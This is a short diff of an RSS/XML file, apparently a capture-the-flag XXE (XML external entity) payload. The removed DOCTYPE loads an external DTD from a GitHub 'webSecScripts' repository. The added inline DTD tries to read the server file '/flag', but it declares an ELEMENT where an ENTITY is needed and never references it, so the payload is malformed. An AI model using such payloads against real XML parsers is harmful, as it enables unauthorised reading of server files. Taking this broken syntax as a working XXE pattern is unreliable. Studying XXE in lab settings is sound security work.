@@ -1,6 +1,8 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE foo SYSTEM "https://raw.githubusercontent.com/geoffreychenn/webSecScripts/master/feedifier/feedifier2.dtd">
-
+<!DOCTYPE foo [
+<!ELEMENT foo (file)>
+<!ELEMENT file "file:/flag">
+]>
 <rss version="2.0">
-<foo><file>anything</file></foo>
+<foo><file></file></foo>
 </rss>
